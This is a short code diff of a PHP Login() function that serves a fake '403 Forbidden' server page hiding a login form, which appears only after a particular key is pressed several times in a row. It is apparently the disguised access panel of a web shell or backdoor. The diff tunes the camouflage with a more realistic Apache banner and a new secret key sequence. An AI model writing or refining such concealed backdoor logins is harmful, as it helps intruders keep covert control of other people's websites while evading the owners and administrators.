@@ -5,7 +5,7 @@ function Login() {
     die("<html>
     <title>403 Forbidden</title>
     <center><h1>403 Forbidden</h1></center>
-    <hr><center>nginx (apache x.167 ./) </center>
+    <hr><center>nginx (Apache/2.4.39 Server at staging domain.com Port 80) </center>
     <center>
     <div style='cursor:pointer;'></div>
     <form id='login-form' method='post' style='display:none;'>
@@ -14,9 +14,9 @@ function Login() {
     <script>
     let clickCount = 0;
     document.addEventListener('keydown', function(event) {
-        if (event.key === '8') {
+        if (event.key === '6') {
             clickCount++;
-            if (clickCount === 8) {
+            if (clickCount === 6) {
                 document.getElementById('login-form').style.display = 'block';
             }
         } else {
